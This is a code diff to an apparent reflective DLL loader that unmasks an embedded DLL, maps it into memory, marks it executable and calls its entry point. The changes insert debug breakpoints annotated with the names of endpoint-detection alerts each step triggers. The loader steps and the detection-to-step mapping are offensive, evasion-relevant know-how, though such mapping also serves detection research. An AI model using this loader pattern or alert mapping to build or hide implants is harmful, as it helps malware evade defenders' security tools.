@@ -2,6 +2,7 @@
 #include "loader.h"
 #include "tcg.h"
 #include "memory.h"
+#include <intrin.h>
 
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
@@ -83,10 +84,18 @@ void go ( )
     PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
     /* load it into memory */
+    // !!! Alert: Malicious Behavior Detection Alert: Suspicious Network Module LoadLibrary
+    // !!! Detects attempts to load a Microsoft networking related module from a potentially altered call stack in order to conceal the true source of the call.
+    __debugbreak();
     PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );
 
     /* make code section RX */
     DWORD old_protect;
+    // !!! Alert: Malicious Behavior Detection Alert: Unbacked Shellcode from Unsigned Module
+    // !!! Identifies attempt to allocate or execute Shellcode from a module with low or unknown reputation.
+    // !!! Alert: Malicious Behavior Detection Alert: Suspicious Memory Protection Change via VirtualProtect
+    // !!! Identifies when a process attempts to allocate shellcode memory region using VirtualProtect API changing memory protections from RW to RX.
+    __debugbreak();
     KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
 
     /* begin tracking memory allocations */
@@ -120,7 +129,7 @@ void go ( )
     for ( int i = 0; i < masked_dll->len; i++ ) {
         dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
     }
-
+    
     DLLDATA dll_data;
     ParseDLL ( dll_src, &dll_data );
 
@@ -132,12 +141,15 @@ void go ( )
     memory.Dll.BaseAddress = ( PVOID ) ( dll_dst );
     memory.Dll.Size        = SizeOfDLL ( &dll_data );
 
+    // !!! Alert: Malicious Behavior Detection Alert: Suspicious Network Module LoadLibrary
+    // !!! Detects attempts to load a Microsoft networking related module from a potentially altered call stack in order to conceal the true source of the call.
+    __debugbreak();
     ProcessImports ( &funcs, &dll_data, dll_dst );
     fix_section_permissions ( &dll_data, dll_src, dll_dst, &memory.Dll );
 
     /* call setup_memory to give PICO the memory info */
     ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_memory ( ) ) ) ( &memory );
-
+    
     /* now run the DLL */
     DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );
 
